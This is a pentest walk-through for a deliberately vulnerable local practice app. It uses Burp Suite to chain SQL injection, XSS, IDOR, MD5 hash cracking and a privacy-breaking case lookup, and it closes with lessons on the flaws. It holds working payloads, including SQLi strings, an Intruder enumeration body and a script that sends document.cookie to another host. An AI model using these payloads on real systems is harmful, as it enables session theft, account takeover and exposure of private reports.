# Pentest walk-through

Here are pentest walk-through instruction for the app.
They are written with Burp Suite in mind.

## Info

Following is the information given.

```
Target: http://localhost:4200
User: jim@dm.example
Pass: ilovepam
```

You can start the app by running `docker compose up` from root of the
repository.

## Login page

<http://localhost:4200/login>

Enter something random and observe the error.
Try just a `"` and observe the error changes.
It means you can do a SQL injection (SQLi) attack.

Try these:

```
" or id = 1 and "" = "
" or email like "admin%
```

Even though there is a SQLi vulnerability we can't login.
That is because we would also somehow need to bypass password hash check.

Something the vulnerable could be used for is to discover additional users.
You can use Burp Intruder to scan for users.
Send your login page to the Intruder, then change the body to:

```
{"email":"\" or email like \"§a§%\" LIMIT 1 --","password":"test"}
```

Use payload type "Brute Forcer" with min=1 and max=1.
This will do a broad user scan in little time.

Notice, there could be more users with a username starting with "a".

Btw.
The password for admin user (`" or email like "admin%`) is short enough to
brute-force.

## Discover other pages

We can see one other page in navigation.
That is the `/about` page.

Use "Source" view from browser debug tools (right click -> Inspect).
Search for "/about" in main.\*.js
Scroll a bit around and take note of the additional routes.

## Login with given credentials

If you log in with the given credentials, that opens up a lot of new routes.

<http://localhost:4200/info>

Notice `/info` gives additional usernames and roles.
Can be seen from "Network" tab in debug tools.

Notice that it is calling `/api/company/1`.
You can change the ID to `2` to reveal users from a different company named
"Path-E-Tech".

```
User: boss@unknown.example
Role: INVESTIGATOR

User: dilbert@unknown.example
Role: EMPLOYEE

User: wally@unknown.example
Role: EMPLOYEE

User: alice@unknown.example
Role":"EMPLOYEE
```

## Report a concern

<http://localhost:4200/report/new>

The report page (`/report/new`) is vulnerable to XSS.
You can test it with:

```
<script>alert("Exploited")</script>
```

Or craft a payload to steal cookies, like:

```
<script>fetch(`http://localhost:8000/${document.cookie}`)</script>
```

Then if you view the report by entering the case number at
<http://localhost:4200/report/status> you can test the exploit.

Notice that site promises the user that reports are anonymous.

Also notice that case numbers doesn't look completely random and that it is
able to show the date without it showing up in network tab.

The case number is actually a UNIX-timestamp with minute precision.
Say your case number is "29513661" then you can do `new Date(29513661*60*1000)`
to get the date.

We could use Intruder to do a "Numbers" scan on over the last couple of years,
however that will take a long time.

## Enumerate routes

We are a bit stuck at the moment.
So let's take a look at the routes found in "Discover other pages".

The <http://localhost:4200/user> route shows a page with users.
If you inspect the raw response (debug tools), you'll see the password hashes.
They are MD5 hashes and can be cracked with online tools such as
<https://hashes.com/en/decrypt/hash>.

It reveals:

```
54aea06e65a58b1bc96e060c86b212c3:ilovepam
8df2b7edb88ba2270a320df6651b1422:ilovejim
bdc87b9c894da5168059e00ebffb9077:password1234
```

So we've got these new credentials:

```
User: pam@dm.example
Pass: ilovejim
Role: EMPLOYEE

User: dwight@dm.example
Pass: password1234
Role: INVESTIGATOR
```

Since "<dwight@dm.example>" have a different role it will likely reveal new
information, so lets login with it.

## Access reports

If you go to <http://localhost:4200/case> you can read reported concerns for
the company for a bit of entertainment.

## Enumerate users

<http://localhost:4200/user>

Notice there is a `/user` page in the navigation menu.
It shows a list of users.

You can hit details button to see more details.
If you look at network tab, you'll see it fetches something like `/api/user/3`.
You can use Repeater to get `/api/user/1` instead, which is the admin user.

```
User: admin@mmo.example
passwordHash: $2b$10$lJp7XSw2BiUJit/CBjPXieJXPQJWj01IY.966XnKDH3EDkdVno/o2
```

Notice that the hash has a different format than what we've seen before.
It looks like bcrypt.
We could still attempt a brute force, though it will likely be slow.

If we keep enumerating user ids, we'll see `/api/user/2` is role support and
has a MD5 hash.
Use the online hash decrypt page from before to decrypt it.

```
f15ada4c42f934eea105b4a7ccc3707b:lasthope
```

Credentials for support user:

```
User: support@mmo.example
Pass: lasthope
```

## Enumerate cases

Now, login with the support user.
Then navigate to <http://localhost:4200/support>.

When users create reports the site promises that reports are anonymous.
But here we have a page to lookup cases based on email.
When doing a pentest, don't take any promises for granted.

Guessing they got so many support calls from user that forgot their case
number, that they've ended up making a recovery page for it.
This is something you often see in small businesses, where there is a push to
lower the security posture to support some business goal.
In this case, it is undermining the privacy of users to deal with angry support
calls.

Use Intruder to lookup cases for all emails you've seen so far.

```
jim@dm.example
boss@unknown.example
dilbert@unknown.example
wally@unknown.example
alice@unknown.example
pam@dm.example
dwight@dm.example
admin@mmo.example
support@mmo.example
```

It reveals one case we haven't seen before.
That is:

```json
{ "caseNo": "13371337", "userId": 8, "status": "OPENED", "companyId": 2 }
```

Login with dwight again.
Go to <http://localhost:4200/case> and click "Show" on one of the cases.
In the network traffic, you will see it gets something like
`/api/report/Dunder%20Mifflin/29293297.html`.

We can then construct the path `/api/report/Path-E-Tech/13371337.html` to read
the "hidden" report.

The 4th wall breaks a bit here, since we are getting an Easter egg reference to
the 1995 movie Hackers.
Coincidently `new Date(13371337*60*1000)` is a date in 1995.
Anyway, it reveals the admin password is `god`.

You now know the credentials for the admin user.
This is where we will stop our testing.

Notice there are probably other routes we could have gone to get the admin
password.
Also, just because something has been pentested, that is no guarantee that all
vulnerabilities have been discovered.

## Main flaws

What did we learn?

- Some flaws like the SQLi on login page are not always immediately exploitable
  in any serious way. It shouldn't be there, but it is not trivially to exploit.
- Script injection is bad, if JS have access to auth token.
- Case number lacks entropy. They should be really long and random.
- Authorization rules wasn't tested. It is common for devs only to test the "happy-path".
- The support page breaks the privacy promise. Can you really trust a company
  when they claim nobody can access your data?
- Exploiting is often combining several minor flaws
